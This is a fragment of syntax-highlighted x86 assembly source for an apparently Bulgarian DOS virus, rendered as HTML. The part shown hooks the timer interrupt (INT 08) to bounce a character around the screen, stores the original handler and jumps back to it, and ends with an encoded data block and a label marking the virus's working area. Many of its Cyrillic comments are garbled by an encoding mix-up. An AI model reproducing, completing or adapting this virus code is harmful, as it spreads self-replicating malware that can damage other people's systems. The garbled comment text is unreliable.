    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">SEG0000</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FC9</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">;Запазва ▒▓а░и┐▓ INT 8</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FCB</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">

</span><span class="sc5">L7EDE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc1">;=====================================================================;</span><span class="sc0">
</span><span class="sc1">;   ТАЗИ ПРОГРАМА СЕ ВРЪЗВА НА МЯСТОТО НА ИСТИНСКИЯТ int 08       ;</span><span class="sc0">
</span><span class="sc1">;=====================================================================;</span><span class="sc0">
</span><span class="sc5">NewINT08</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">;Запазва по▓░еби▓ел▒ки▓е ░еги▒▓░и</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">;Оп░ав┐ ▒об▒▓вени┐▓ DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">;Get current video mode</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FD4</span><span class="sc0">   </span><span class="sc1">;mode = ▒▓а░и┐▓ mode</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">L7F27</span><span class="sc0">           </span><span class="sc1">;да, п░од║лжава</span><span class="sc0">

    </span><span class="sc1">;---- Режим║▓ на ди▒плей е п░оменен. У▒▓анов┐в┐ нови┐▓ ░ежим ----;</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FD4</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">   </span><span class="sc1">;запи▒ва ▒▓░ани╢а▓а и mode</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FD6</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">   </span><span class="sc1">;запазва char_per_line-1</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">          </span><span class="sc1">;mode = text b/w MGA, EGA?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7F05</span><span class="sc0">           </span><span class="sc1">;не</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">

</span><span class="sc5">L7F05</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">          </span><span class="sc1">;mode = graphics?</span><span class="sc0">
    </span><span class="sc6">JNC</span><span class="sc0"> </span><span class="sc5">L7F0C</span><span class="sc0">           </span><span class="sc1">;да</span><span class="sc0">
    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">

</span><span class="sc5">L7F0C</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FD3</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FCF</span><span class="sc4">,</span><span class="sc2">0101h</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FD1</span><span class="sc4">,</span><span class="sc2">0101h</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">;Read cursor position and size</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">          </span><span class="sc1">;Запазва пози╢и┐▓а на к│░▒о░а</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FCF</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">L7F4A</span><span class="sc0">


    </span><span class="sc1">;---- Режим║▓ на ди▒пле┐ (mode) не е п░омен┐н ----;</span><span class="sc0">
</span><span class="sc5">L7F27</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">;Read cursor position and size</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">          </span><span class="sc1">;Запазва cursor pos &amp; size</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">          </span><span class="sc1">;Set cursor position</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FCF</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FCD</span><span class="sc0">   </span><span class="sc1">;Оп░едел┐ какво да пи╕е по ек░ана</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FD3</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">;mode = GRAPF?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7F41</span><span class="sc0">           </span><span class="sc1">;не</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">8307h</span><span class="sc0">

</span><span class="sc5">L7F41</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">           </span><span class="sc1">;Write character &amp; attribute</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">



    </span><span class="sc1">;---- Ко░иги░а пози╢и┐▓а на к│░▒о░а ----;</span><span class="sc0">
</span><span class="sc5">L7F4A</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FD1</span><span class="sc0">

    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Up</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7F58</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc0">

</span><span class="sc5">L7F58</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">          </span><span class="sc1">;Down</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7F62</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc0">

</span><span class="sc5">L7F62</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Left</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7F6C</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">

</span><span class="sc5">L7F6C</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FD6</span><span class="sc0">   </span><span class="sc1">;Right</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7F77</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">

</span><span class="sc5">L7F77</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FD1</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7F94</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FCD</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7F8B</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc0">
</span><span class="sc5">L7F8B</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7F94</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">

</span><span class="sc5">L7F94</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FD1</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FCF</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">         </span><span class="sc1">;Set cursor position</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">          </span><span class="sc1">;Read character &amp; attribute</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FCD</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc5">D7FD3</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">;mode = GRAPH?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">L7FB6</span><span class="sc0">           </span><span class="sc1">;не</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">

</span><span class="sc5">L7FB6</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">        </span><span class="sc1">;Write character &amp; attribute</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0907h</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">          </span><span class="sc1">;Restore cursor position</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">          </span><span class="sc1">;В║з▒▓анов┐ва по▓░еби▓ел▒ки▓е ░еги▒▓░и</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">D7FC9</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">D7FCB</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">INTERR8</span><span class="sc0">         </span><span class="sc1">;О▓ива на и▒▓ин▒ки┐▓ INT 08</span><span class="sc0">

</span><span class="sc5">D7FCD</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">D7FCF</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0101h</span><span class="sc0">           </span><span class="sc1">;Рабо▓на пози╢и┐ на ек░ана на ви░│▒а</span><span class="sc0">
</span><span class="sc5">D7FD1</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0101h</span><span class="sc0">
</span><span class="sc5">D7FD3</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; 1 - mode = graph, b800</span><span class="sc0">
                    </span><span class="sc1">; 0 - mode = text,  b800</span><span class="sc0">
                    </span><span class="sc1">;-1 - mode = 7, text b/w EGA,HGA</span><span class="sc0">

</span><span class="sc5">D7FD4</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0FFFFh</span><span class="sc0">          </span><span class="sc1">;▒ами┐▓ mode</span><span class="sc0">
</span><span class="sc5">D7FD6</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">50h</span><span class="sc0">         </span><span class="sc1">;б░ой ▒имволи на ░ед</span><span class="sc0">


    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0B7h</span><span class="sc4">,</span><span class="sc2">0B7h</span><span class="sc4">,</span><span class="sc2">0B7h</span><span class="sc4">,</span><span class="sc2">0B6h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">088h</span><span class="sc4">,</span><span class="sc2">0DEh</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0E6h</span><span class="sc4">,</span><span class="sc2">05Ah</span><span class="sc4">,</span><span class="sc2">0ACh</span><span class="sc4">,</span><span class="sc2">0D2h</span><span class="sc4">,</span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc2">0EAh</span><span class="sc4">,</span><span class="sc2">0E6h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">0ECh</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc2">05Ch</span><span class="sc4">,</span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc2">05Eh</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc2">060h</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">05Eh</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc2">0B7h</span><span class="sc4">,</span><span class="sc2">0B7h</span><span class="sc4">,</span><span class="sc2">0B7h</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0B6h</span><span class="sc0">


</span><span class="sc1">;*************************************************************</span><span class="sc0">
</span><span class="sc1">;         РАБОТНА ОБЛАСТ НА ВИРУСА</span><span class="sc0">
</span><span class="sc5">D8000</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">SEG0000</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
    </span><span class="sc9">END</span><span class="sc0">
</span></div></body>
</html>
